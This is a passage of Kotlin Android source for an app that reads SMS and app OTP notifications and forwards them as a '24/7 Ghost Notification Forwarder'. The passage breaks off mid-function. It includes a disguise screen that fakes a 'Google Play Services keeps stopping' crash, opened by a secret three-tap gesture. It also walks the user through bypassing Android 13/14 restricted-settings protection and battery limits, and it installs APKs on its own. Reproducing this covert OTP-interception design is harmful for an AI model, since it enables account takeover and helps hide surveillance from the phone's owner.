package com.example.otpforwarder

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.KeyguardManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import kotlinx.coroutines.launch

// MNC-Grade Obsidian Color Palette (Linear / Stripe Inspired)
val DarkBg = Color(0xFF090D16)
val CardBg = Color(0xFF111827)
val CardBorder = Color(0xFF1F2937)
val AccentEmerald = Color(0xFF10B981)
val AccentIndigo = Color(0xFF6366F1)
val AccentAmber = Color(0xFFF59E0B)
val TextPrimary = Color(0xFFF9FAFB)
val TextSecondary = Color(0xFF9CA3AF)
val TextMuted = Color(0xFF6B7280)

class MainActivity : ComponentActivity() {

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ ->
        // Notification permission handled
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Ensure Launcher Icon is always ENABLED (Permanently fixes duplicate app icon and disabled shortcut bugs)
        try {
            val comp = ComponentName(this, MainActivity::class.java)
            if (packageManager.getComponentEnabledSetting(comp) != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                packageManager.setComponentEnabledSetting(
                    comp,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        } catch (ignored: Exception) {}

        requestAppPermissions()

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBg
                ) {
                    RootAppScreen(
                        onOpenNotificationSettings = {
                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                            startActivity(intent)
                        },
                        onRequestPermissions = { requestAppPermissions() },
                        onExitApp = { finish() }
                    )
                }
            }
        }
    }

    private fun requestAppPermissions() {
        // NotificationListener is 100% sufficient for reading SMS and all app OTP notifications.
        // We only request POST_NOTIFICATIONS on Android 13+ for status alerts.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }
}

fun checkNotificationAccess(context: Context): Boolean {
    val pkgName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat != null && flat.contains(pkgName)
}

fun isIgnoringBatteryOptimizations(context: Context): Boolean {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
        return pm.isIgnoringBatteryOptimizations(context.packageName)
    }
    return true
}

fun openAppInfoSettings(context: Context) {
    try {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", context.packageName, null)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    } catch (e: Exception) {
        Toast.makeText(context, "Could not open App Info: ${e.localizedMessage}", Toast.LENGTH_SHORT).show()
    }
}

@Composable
fun RootAppScreen(
    onOpenNotificationSettings: () -> Unit,
    onRequestPermissions: () -> Unit,
    onExitApp: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { PrefsHelper.getPrefs(context) }

    val isFakeCrashEnabled = remember { prefs.getBoolean("fake_crash_enabled", false) }
    var isFakeCrashPassed by remember { mutableStateOf(!isFakeCrashEnabled) }

    val isAppLockEnabled = remember { prefs.getBoolean("app_lock_enabled", false) }
    var isAppUnlocked by remember { mutableStateOf(!isAppLockEnabled) }

    if (!isFakeCrashPassed) {
        FakeCrashScreen(
            onUnlock = { isFakeCrashPassed = true },
            onExit = onExitApp
        )
    } else if (!isAppUnlocked) {
        AppLockScreen(
            onUnlockSuccess = { isAppUnlocked = true },
            onExit = onExitApp
        )
    } else {
        MainScreenContent(
            onOpenNotificationSettings = onOpenNotificationSettings,
            onRequestPermissions = onRequestPermissions
        )
    }
}

@Composable
fun FakeCrashScreen(onUnlock: () -> Unit, onExit: () -> Unit) {
    val context = LocalContext.current
    var tapCount by remember { mutableStateOf(0) }
    var lastTapTime by remember { mutableStateOf(0L) }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF0F172A))
            .padding(24.dp),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
            shape = RoundedCornerShape(20.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Secret tap icon (3 taps within 1.5s bypasses the disguise)
                Box(
                    modifier = Modifier
                        .size(64.dp)
                        .clip(CircleShape)
                        .background(Color(0xFF334155))
                        .clickable {
                            val now = System.currentTimeMillis()
                            if (now - lastTapTime < 1500) {
                                tapCount++
                            } else {
                                tapCount = 1
                            }
                            lastTapTime = now
                            if (tapCount >= 3) {
                                Toast.makeText(context, "🔓 Disguise Bypassed", Toast.LENGTH_SHORT).show()
                                onUnlock()
                            }
                        },
                    contentAlignment = Alignment.Center
                ) {
                    Text("⚠️", fontSize = 36.sp)
                }

                Spacer(modifier = Modifier.height(16.dp))

                Text(
                    text = "Google Play Services keeps stopping",
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(10.dp))

                Text(
                    text = "com.google.android.gms has encountered an unexpected background error and had to close.",
                    fontSize = 12.sp,
                    color = TextSecondary,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = onExit,
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text("Close app", color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                }

                Spacer(modifier = Modifier.height(10.dp))

                OutlinedButton(
                    onClick = onExit,
                    shape = RoundedCornerShape(12.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text("Send feedback", color = TextSecondary, fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun AppLockScreen(onUnlockSuccess: () -> Unit, onExit: () -> Unit) {
    val context = LocalContext.current
    val keyguardManager = remember { context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager }

    val authLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            Toast.makeText(context, "✅ Identity Verified", Toast.LENGTH_SHORT).show()
            onUnlockSuccess()
        } else {
            Toast.makeText(context, "❌ Authentication Failed / Cancelled", Toast.LENGTH_SHORT).show()
        }
    }

    val launchAuth = {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val intent = keyguardManager?.createConfirmDeviceCredentialIntent(
                "Smart Notifier Security",
                "Enter phone Fingerprint, PIN, or Pattern to access"
            )
            if (intent != null) {
                authLauncher.launch(intent)
            } else {
                onUnlockSuccess()
            }
        } else {
            onUnlockSuccess()
        }
    }

    LaunchedEffect(Unit) {
        launchAuth()
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(DarkBg)
            .padding(24.dp),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CardBg),
            border = BorderStroke(1.dp, CardBorder),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(28.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text("🔒", fontSize = 48.sp)
                Spacer(modifier = Modifier.height(14.dp))
                Text(
                    text = "App Lock Active",
                    fontSize = 19.sp,
                    fontWeight = FontWeight.Bold,
                    color = TextPrimary
                )
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = "Phone Fingerprint ya PIN verify karke open karein.",
                    fontSize = 13.sp,
                    color = TextSecondary,
                    textAlign = TextAlign.Center
                )
                Spacer(modifier = Modifier.height(24.dp))
                Button(
                    onClick = { launchAuth() },
                    modifier = Modifier.fillMaxWidth().height(48.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
                ) {
                    Text("🔓 Unlock Now (Biometric / PIN)", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                }
                Spacer(modifier = Modifier.height(10.dp))
                OutlinedButton(
                    onClick = onExit,
                    shape = RoundedCornerShape(12.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text("Exit", color = TextSecondary, fontSize = 13.sp)
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainScreenContent(
    onOpenNotificationSettings: () -> Unit,
    onRequestPermissions: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()
    val lifecycleOwner = LocalLifecycleOwner.current
    val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)

    var selectedScreen by remember { mutableStateOf(0) } // 0: Channels, 1: Autostart, 2: History, 3: Support, 4: Pro/PayTM
    var isMasterEnabled by remember { mutableStateOf(prefs.getBoolean("is_enabled", true)) }
    var hasNotificationAccess by remember { mutableStateOf(checkNotificationAccess(context)) }
    var hasBatteryExemption by remember { mutableStateOf(isIgnoringBatteryOptimizations(context)) }

    var isFounderConsoleOpen by remember { mutableStateOf(false) }
    var showHelpDialog by remember { mutableStateOf(false) }
    var showSupportChat by remember { mutableStateOf(false) }
    var showUpdateDialog by remember { mutableStateOf(false) }
    var updateResult by remember { mutableStateOf<UpdateCheckResult?>(null) }
    var isCheckingUpdate by remember { mutableStateOf(false) }

    // Instant State Refresh when returning from OS Settings
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                hasNotificationAccess = checkNotificationAccess(context)
                hasBatteryExemption = isIgnoringBatteryOptimizations(context)
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    // Cloudflare Session Verification & Trial Check
    LaunchedEffect(Unit) {
        hasNotificationAccess = checkNotificationAccess(context)
        hasBatteryExemption = isIgnoringBatteryOptimizations(context)

        if (!CloudflareLicenseManager.isMasterFounder(context)) {
            val sessionRes = CloudflareLicenseManager.verifySession(context)
            if (sessionRes.second) { // Auto-logged out!
                Toast.makeText(context, "⚠️ ${sessionRes.third}", Toast.LENGTH_LONG).show()
            } else {
                CloudflareLicenseManager.checkOrStartTrial(context)
            }
        }
    }

    if (isFounderConsoleOpen) {
        FounderConsoleScreen(
            context = context,
            onExit = { isFounderConsoleOpen = false }
        )
        return
    }

    ModalNavigationDrawer(
        drawerState = drawerState,
        drawerContent = {
            ModalDrawerSheet(
                drawerContainerColor = Color(0xFF0F172A),
                drawerContentColor = Color.White,
                modifier = Modifier.width(310.dp)
            ) {
                // Drawer Header
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFF1E1B4B))
                        .padding(horizontal = 20.dp, vertical = 24.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text(
                            text = "🛡️ Smart Notifier",
                            fontWeight = FontWeight.ExtraBold,
                            fontSize = 18.sp,
                            color = Color.White
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .clip(CircleShape)
                                .background(if (isMasterEnabled) AccentEmerald else Color.Red)
                        )
                    }
                    Text(
                        text = "24/7 Ghost Notification Forwarder",
                        fontSize = 11.sp,
                        color = Color(0xFFA5B4FC)
                    )
                    Spacer(modifier = Modifier.height(12.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Surface(
                            color = Color(0xFF312E81),
                            shape = RoundedCornerShape(8.dp)
                        ) {
                            Text(
                                text = "Device: ${CloudflareLicenseManager.getDeviceId(context).take(8)}...",
                                fontSize = 10.sp,
                                color = Color(0xFFC7D2FE),
                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                            )
                        }

                        Surface(
                            color = if (CloudflareLicenseManager.isMasterFounder(context)) Color(0xFF78350F) else Color(0xFF064E3B),
                            shape = RoundedCornerShape(8.dp)
                        ) {
                            Text(
                                text = if (CloudflareLicenseManager.isMasterFounder(context)) "👑 FOUNDER" else "💎 PRO",
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (CloudflareLicenseManager.isMasterFounder(context)) Color(0xFFFBBF24) else Color(0xFF34D399),
                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                            )
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Menu Items
                DrawerNavItem("⚡ Forwarding Channels", selected = selectedScreen == 0) {
                    selectedScreen = 0
                    scope.launch { drawerState.close() }
                }
                DrawerNavItem("🛡️ 24/7 Autostart & Battery", selected = selectedScreen == 1) {
                    selectedScreen = 1
                    scope.launch { drawerState.close() }
                }
                DrawerNavItem("📜 Forwarding History", selected = selectedScreen == 2) {
                    selectedScreen = 2
                    scope.launch { drawerState.close() }
                }
                DrawerNavItem("💬 Live Support Desk", selected = selectedScreen == 3) {
                    selectedScreen = 3
                    scope.launch { drawerState.close() }
                }
                DrawerNavItem("💎 Lifetime Pro (₹199)", selected = selectedScreen == 4) {
                    selectedScreen = 4
                    scope.launch { drawerState.close() }
                }
                DrawerNavItem("❓ Kaise Use Karein? (Guide)", selected = false) {
                    showHelpDialog = true
                    scope.launch { drawerState.close() }
                }
                DrawerNavItem(if (isCheckingUpdate) "🔄 Checking..." else "🔄 Check for Updates", selected = false) {
                    scope.launch {
                        drawerState.close()
                        isCheckingUpdate = true
                        val res = AppUpdater.checkForUpdate(context)
                        if (res.hasUpdate) {
                            updateResult = res
                            showUpdateDialog = true
                        } else {
                            Toast.makeText(context, "✅ App already latest version (v${res.currentVersion}) par hai!", Toast.LENGTH_LONG).show()
                        }
                        isCheckingUpdate = false
                    }
                }

                Spacer(modifier = Modifier.weight(1f))
                HorizontalDivider(color = Color(0xFF334155))

                // Master Founder Secret Door
                DrawerNavItem("🔐 Master Founder Portal", selected = false, isAccent = true) {
                    isFounderConsoleOpen = true
                    scope.launch { drawerState.close() }
                }
                Spacer(modifier = Modifier.height(14.dp))
            }
        }
    ) {
        Scaffold(
            topBar = {
                TopAppBar(
                    title = {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = when (selectedScreen) {
                                    0 -> "Channels Setup"
                                    1 -> "24/7 Autostart"
                                    2 -> "Forwarding History"
                                    3 -> "Live Support Desk"
                                    4 -> "Lifetime Pro"
                                    else -> "Smart Notifier"
                                },
                                fontWeight = FontWeight.Bold,
                                fontSize = 17.sp,
                                color = Color.White
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Box(
                                modifier = Modifier
                                    .size(7.dp)
                                    .clip(CircleShape)
                                    .background(if (isMasterEnabled) AccentEmerald else Color(0xFFEF4444))
                            )
                        }
                    },
                    navigationIcon = {
                        IconButton(onClick = { scope.launch { drawerState.open() } }) {
                            Text("☰", fontSize = 24.sp, color = Color.White, fontWeight = FontWeight.Bold)
                        }
                    },
                    actions = {
                        // Quick Support Button
                        IconButton(onClick = { showSupportChat = true }) {
                            Text("💬", fontSize = 18.sp)
                        }
                        // Master Switch
                        Switch(
                            checked = isMasterEnabled,
                            onCheckedChange = { checked ->
                                isMasterEnabled = checked
                                prefs.edit().putBoolean("is_enabled", checked).apply()
                            },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = AccentEmerald,
                                uncheckedThumbColor = Color.Gray,
                                uncheckedTrackColor = Color(0xFF1E293B)
                            ),
                            modifier = Modifier.padding(end = 8.dp)
                        )
                    },
                    colors = TopAppBarDefaults.topAppBarColors(containerColor = CardBg)
                )
            },
            containerColor = DarkBg
        ) { paddingValues ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(paddingValues)
            ) {
                // Top Compulsory Setup Warning if not granted
                if (!hasNotificationAccess || !hasBatteryExemption) {
                    Surface(
                        color = Color(0xFF2D1204),
                        border = BorderStroke(1.dp, Color(0xFFEA580C)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 16.dp, vertical = 8.dp)
                    ) {
                        Row(
                            modifier = Modifier.padding(10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Column(modifier = Modifier.weight(1f)) {
                                Text("⚠️ 24/7 Setup Incomplete", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFFDE047))
                                Text("Phone app ko sleep kar sakta hai", fontSize = 10.sp, color = Color(0xFFFEF08A))
                            }
                            Button(
                                onClick = { selectedScreen = 1 },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                                shape = RoundedCornerShape(6.dp),
                                contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
                            ) {
                                Text("Fix Now", fontSize = 10.sp, color = Color.Black, fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                }

                // Main Content Body
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(horizontal = 16.dp)
                ) {
                    when (selectedScreen) {
                        0 -> ServicesTab(
                            context = context,
                            onOpenHelp = { showHelpDialog = true },
                            onOpenSupportChat = { showSupportChat = true }
                        )
                        1 -> AutostartScreen(
                            context = context,
                            hasNotificationAccess = hasNotificationAccess,
                            hasBatteryExemption = hasBatteryExemption,
                            onOpenNotificationSettings = onOpenNotificationSettings
                        )
                        2 -> HistoryTab(context)
                        3 -> SupportChatScreen(context)
                        4 -> ProPaytmTab(context)
                    }
                }
            }
        }
    }

    // In-App Quick Setup Guide Modal
    if (showHelpDialog) {
        QuickSetupGuideDialog(
            context = context,
            onDismiss = { showHelpDialog = false }
        )
    }

    // Live Customer Support Chat Modal
    if (showSupportChat) {
        SupportChatDialog(
            context = context,
            onDismiss = { showSupportChat = false }
        )
    }

    // In-App Update Available Dialog
    if (showUpdateDialog && updateResult != null) {
        var updateProgress by remember { mutableStateOf("") }
        var isDownloading by remember { mutableStateOf(false) }

        AlertDialog(
            onDismissRequest = { if (!isDownloading) showUpdateDialog = false },
            containerColor = Color(0xFF0F172A),
            title = {
                Text("🚀 Naya Update Available!", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFF60A5FA))
            },
            text = {
                Column {
                    Text("New Version: v${updateResult!!.latestVersion}", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentEmerald)
                    Spacer(modifier = Modifier.height(4.dp))
                    Text("Current Installed: v${updateResult!!.currentVersion}", fontSize = 11.sp, color = TextSecondary)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(updateResult!!.releaseNotes, fontSize = 12.sp, color = Color.White)
                    if (updateProgress.isNotEmpty()) {
                        Spacer(modifier = Modifier.height(10.dp))
                        Text(updateProgress, fontSize = 11.sp, color = Color(0xFFFDE047))
                    }
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        isDownloading = true
                        updateProgress = "Starting download..."
                        scope.launch {
                            val res = AppUpdater.downloadAndInstall(context, updateResult!!.apkUrl) { progress ->
                                updateProgress = progress
                            }
                            if (!res.first) {
                                Toast.makeText(context, "Error: ${res.second}", Toast.LENGTH_LONG).show()
                            }
                            isDownloading = false
                        }
                    },
                    enabled = !isDownloading,
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
                ) {
                    Text(if (isDownloading) "Downloading..." else "Install Update", fontSize = 12.sp)
                }
            },
            dismissButton = {
                if (!isDownloading) {
                    TextButton(onClick = { showUpdateDialog = false }) {
                        Text("Later", color = TextSecondary)
                    }
                }
            }
        )
    }
}

@Composable
fun DrawerNavItem(
    label: String,
    selected: Boolean,
    isAccent: Boolean = false,
    onClick: () -> Unit
) {
    Surface(
        color = when {
            selected -> Color(0xFF312E81)
            isAccent -> Color(0xFF1E1B4B)
            else -> Color.Transparent
        },
        shape = RoundedCornerShape(10.dp),
        modifier = Modifier
            .fillMaxWidth()
            .padding(horizontal = 12.dp, vertical = 3.dp)
            .clickable { onClick() }
    ) {
        Row(
            modifier = Modifier.padding(horizontal = 14.dp, vertical = 12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                text = label,
                fontSize = 13.sp,
                fontWeight = if (selected || isAccent) FontWeight.Bold else FontWeight.Medium,
                color = when {
                    isAccent -> Color(0xFFFBBF24)
                    selected -> Color(0xFF818CF8)
                    else -> Color(0xFFCBD5E1)
                }
            )
        }
    }
}

@Composable
fun AutostartScreen(
    context: Context,
    hasNotificationAccess: Boolean,
    hasBatteryExemption: Boolean,
    onOpenNotificationSettings: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 12.dp)
    ) {
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("🛡️ 24/7 Deep Sleep & Autostart Setup", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFFBBF24))
                Text("Phone ki battery optimization ko band karein taaki OTP kabhi na chhoote:", fontSize = 11.sp, color = TextSecondary)
                Spacer(modifier = Modifier.height(14.dp))

                // Status 1: Autostart
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("1. Autostart & Battery Saver (${Build.MANUFACTURER.uppercase()})", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
                        Text(
                            text = if (hasBatteryExemption) "✅ 24/7 Running Active" else "❌ Pending (${Build.MANUFACTURER.uppercase()} isko sleep kar sakta hai)",
                            fontSize = 10.sp,
                            color = if (hasBatteryExemption) Color(0xFF34D399) else Color(0xFFF87171)
                        )
                    }
                    Button(
                        onClick = { BrandAutoStartHelper.openAutoStartSettings(context) },
                        colors = ButtonDefaults.buttonColors(containerColor = if (hasBatteryExemption) Color(0xFF065F46) else Color(0xFFF59E0B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        Text(if (hasBatteryExemption) "Settings" else "🚀 1-Click Active", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (hasBatteryExemption) Color.White else Color.Black)
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))
                HorizontalDivider(color = CardBorder)
                Spacer(modifier = Modifier.height(12.dp))

                // Status 2: Notification Listener
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("2. Notification & SMS Reader Access", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
                        Text(
                            text = if (hasNotificationAccess) "✅ OTP Reader Active" else "❌ Pending (OTP nahi padh payega)",
                            fontSize = 10.sp,
                            color = if (hasNotificationAccess) Color(0xFF34D399) else Color(0xFFF87171)
                        )
                    }
                    Button(
                        onClick = onOpenNotificationSettings,
                        colors = ButtonDefaults.buttonColors(containerColor = if (hasNotificationAccess) Color(0xFF065F46) else Color(0xFFEAB308)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        Text(if (hasNotificationAccess) "Granted" else "⚙️ Allow", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (hasNotificationAccess) Color.White else Color.Black)
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))
                HorizontalDivider(color = CardBorder)
                Spacer(modifier = Modifier.height(12.dp))

                // Status 3: Android 13/14 Restricted Settings Direct 1-Click Opener
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("3. Restricted Settings Unlock (Android 13/14)", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
                        Text(
                            text = "Agar Notification switch band/grey dikhe to yaha se App Info kholein",
                            fontSize = 10.sp,
                            color = Color(0xFFA5B4FC)
                        )
                    }
                    Button(
                        onClick = { openAppInfoSettings(context) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        Text("⚙️ App Info", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color.White)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Android 13/14 Restricted Settings Step-by-Step Guide Card
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("⚠️ Android 13/14 'Restricted Setting' Solution (Teer / 3 Dots):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFFBBF24))
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = "Agar Notification switch dabane par 'Restricted setting' likha aata hai:\n" +
                            "1️⃣ Upar diye gaye '⚙️ App Info' button par click karein.\n" +
                            "2️⃣ App Info screen ke upar right side me 3 dots [⋮] ya teer [↗] par click karein.\n" +
                            "3️⃣ 'Allow restricted settings' select karein aur screen lock/PIN enter karein.\n" +
                            "4️⃣ Wapas aakar '⚙️ Allow' dabayein, switch turant ON ho jayega!",
                    fontSize = 11.sp,
                    color = Color(0xFFCBD5E1),
                    lineHeight = 17.sp
                )
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Device Brand Instructions
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("📖 Phone-Specific Instructions (${Build.MANUFACTURER.uppercase()}):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentEmerald)
                Spacer(modifier = Modifier.height(8.dp))
                val instructions = when {
                    Build.MANUFACTURER.contains("xiaomi", true) || Build.MANUFACTURER.contains("redmi", true) || Build.MANUFACTURER.contains("poco", true) ->
                        "• Xiaomi/Redmi/Poco: '1-Click Active' dabakar 'Autostart' ko ON karein aur Battery Saver ko 'No restrictions' par set karein."
                    Build.MANUFACTURER.contains("vivo", true) || Build.MANUFACTURER.contains("iqoo", true) ->
                        "• Vivo/iQOO: '1-Click Active' dabakar 'High background power consumption' ko ON karein."
                    Build.MANUFACTURER.contains("oppo", true) || Build.MANUFACTURER.contains("realme", true) || Build.MANUFACTURER.contains("oneplus", true) ->
                        "• Oppo/Realme/OnePlus: '1-Click Active' dabakar 'Allow background activity' aur 'Auto-launch' ON karein."
                    Build.MANUFACTURER.contains("samsung", true) ->
                        "• Samsung: '1-Click Active' dabakar Smart Notifier ko 'Never sleeping apps' list me add karein."
                    else ->
                        "• Standard Android: '1-Click Active' dabayein aur system prompt me 'Allow' select karein."
                }
                Text(instructions, fontSize = 11.sp, color = TextSecondary, lineHeight = 16.sp)
            }
        }
    }
}

@Composable
fun RowScope.NavPill(text: String, selected: Boolean, onClick: () -> Unit) {
    Surface(
        modifier = Modifier
            .weight(1f)
            .height(38.dp)
            .clip(RoundedCornerShape(24.dp))
            .clickable { onClick() },
        color = if (selected) AccentIndigo else Color.Transparent,
        shape = RoundedCornerShape(24.dp)
    ) {
        Box(contentAlignment = Alignment.Center) {
            Text(
                text = text,
                fontSize = 12.sp,
                fontWeight = if (selected) FontWeight.Bold else FontWeight.Medium,
                color = if (selected) Color.White else TextSecondary
            )
        }
    }
}

@Composable
fun ServicesTab(
    context: Context,
    onOpenHelp: () -> Unit,
    onOpenSupportChat: () -> Unit
) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()
